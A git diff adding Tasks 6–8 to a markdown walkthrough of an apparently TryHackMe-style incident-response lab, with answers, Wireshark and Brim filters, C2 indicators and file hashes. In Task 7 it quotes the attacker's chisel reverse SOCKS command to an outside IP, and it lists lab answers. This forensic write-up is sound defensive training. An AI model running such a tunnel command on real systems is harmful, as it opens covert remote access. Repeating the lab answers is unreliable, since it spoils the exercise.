@@ -333,4 +333,147 @@ In these same log if we see for Event Id 22 we can actually see the domain name.
 ![image18](images/pic20.png)
 ![image18](images/pic21.png)
 For port in same logs we go down and can see event id with 3 and open that log we will se all the details about that network connection.
-[image18](images/pci23.png)
+![image18](images/pci23.png)
+
+## Task6) Initial Access - Malicious Document
+### Malicious Document Traffic
+Based on the collected findings, we discovered that the attacker fetched the stage 2 payload remotely:
+* We discovered the Domain and IP invoked by the malicious document on sysmon logs.
+* There is another domain and IP used by the stage 2 payload logged from the same data source
+### Investigation Guide
+Since we have discovered network-related artefacts, we may again refer to our cheatsheet, which focuses on Network Log Analysis:
+* We can now use Brim and Wireshark to investigate the packet capture.
+* Find network events related to the harvested domains and IP addresses.
+* Sample Brim filter that you can use for this investigation: _path=="http" "malicious domain"
+Data Sources:
+* Packet Capture
+### Answer the questions below
+Q1:What is the URL of the malicious payload embedded in the document?
+```bash
+http://phishteam.xyz/02dcf07/index.html
+```
+As we already know the ip address of the domain so I used a wireshark filter for that.
+```bash
+http and http.request.method=="GET" and ip.addr="167.71.199.191"
+```
+and than we will se all the request made to the domain.
+![image18](images/pic24.png)
+Q2:What is the encoding used by the attacker on the c2 connection?
+```bash
+Base64
+```
+First i filter the traffic for cyberresolve.xyz domain so i can see the what data is being sent
+![image18](images/pic25.png)
+We can see that data is being send to the malicious domain with odd uri so i copied on of the uri and deocded it with base64 so came to know it was sending commands result to the C2 by encoding it into the base64.
+![image18](images/pic26.png)
+Q3:The malicious c2 binary sends a payload using a parameter that contains the executed command results. What is the parameter used by the binary?
+```bash
+q
+```
+We can see in all GET request to C2 q parameter is being used
+![image27](images/pic27.png)
+Q4:The malicious c2 binary connects to a specific URL to get the command to be executed. What is the URL used by the binary?
+```bash
+/9ab62b5
+```
+Again along with parameter this URL was being used
+![image27](images/pic27.png)
+Q5:What is the HTTP method used by the binary?
+```bash
+GET
+```
+GET requests were used for this purpose
+Q6:Based on the user agent, what programming language was used by the attacker to compile the binary? 
+Format: Answer in lowercase
+```bash
+nim
+```
+In GET requests we can see the user-agent
+![image28](images/pic28.png)
+## TASK7) Discovery - Internal Reconnaissance
+### Internal Reconnaissance
+Based on the collected findings, we have discovered that the malicious binary continuously uses the C2 traffic:
+* We can easily decode the encoded string in the network traffic.
+* The traffic contains the command and output executed by the attacker.
+### Investigation Guide
+* To continue with the investigation, we may focus on the following information:
+* Find network and process events connecting to the malicious domain.
+* Find network events that contain an encoded command.
+* We can use Brim to filter all packets containing the encoded string.
+* Look for endpoint enumeration commands since the attacker is already inside the machine
+In addition, we may refer to our cheatsheet for Brim to quickly investigate the encoded traffic with the following filters:
+To get all HTTP requests related to the malicious C@ traffic: _path=="http" "replace domain" id.resp_p==replace port | cut ts, host, id.resp_p, uri | sort ts
+Significant Data Sources:
+* Packet Capture
+* Sysmon
+### Answer the questions below
+Q1:The attacker was able to discover a sensitive file inside the machine of the user. What is the password discovered on the aforementioned file?
+```bash
+infernotempest
+```
+Apply this filter in brim 
+```bash
+__path=="http" "resolvecyber.xyz" id.resp_p==80 | cut ts, host, id.resp_p, uri | sort ts
+```
+after that we look in one of the request to the domain and decoded it 
+![image29](images/pic29.png)
+![image29](images/pic30.png)
+Q2:The attacker then enumerated the list of listening ports inside the machine. What is the listening port that could provide a remote shell inside the machine?
+```bash
+5985
+```
+Again in the packets and there is a packet and I decoded it and there was a netstat command result showing ports connections.
+![image29](images/pic31.png)
+![image29](images/pic32.png)
+Ok so there was port 5985 was opened that is for WinRM HTTP traffic and can be used for remote connection.
+Q3:The attacker then established a reverse socks proxy to access the internal services hosted inside the machine. What is the command executed by the attacker to establish the connection?
+
+Format: Remove the double quotes from the log.
+```bash
+C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
+```
+In the Brims packet there was packet that was showing a encoded command that was downloading a file
+![image29](images/pic33.png)
+![image29](images/pic34.png)
+ch.exe is a tool for reverse soc proxy.So we go to Timeline explorer and search for ch.exe and from these logs we got the executed command
+![image29](images/pic35.png)
+Q4:What is the SHA256 hash of the binary used by the attacker to establish the reverse socks proxy connection?
+```bash
+8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
+```
+In the same logs there was its sha256 hash
+![image29](images/pic36.png)
+Q5:What is the name of the tool used by the attacker based on the SHA256 hash? Provide the answer in lowercase.
+```bash
+chisel
+```
+Copied the hash and paste in virus total 
+![image29](images/pic37.png)
+Q6:The attacker then used the harvested credentials from the machine. Based on the succeeding process after the execution of the socks proxy, what service did the attacker use to authenticate?
+
+Format: Answer in lowercase
+```bash
+winrm
+```
+## Task8) Privilage Escaltion - Exploiting Privilages
+
+### Privilege Escalation
+Based on the collected findings, the attacker gained a stable shell through a reverse socks proxy.
+### Investigation Guide
+With this, we can focus on the following network and endpoint events:
+* Look for events executed after the successful execution of the reverse socks proxy tool.
+* Look for potential privilege escalation attempts, as the attacker has already established a persistent low-privilege access.
+Significant Data Sources:
+* Packet Catpure
+* Sysmon
+### Answer the questions below
+After discovering the privileges of the current user, the attacker then downloaded another binary to be used for privilege escalation. What is the name and the SHA256 hash of the binary?
+
+Format: binary name,SHA256 hash
+```bash
+spf.exe,8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
+```
+For this i went ot wireshark and filter for domain that drops file and there was other 2 files in it 
+![image29](images/pic38.png)
+SO i search for spf in the timeline explorer 
+![image29](images/pic39.png)
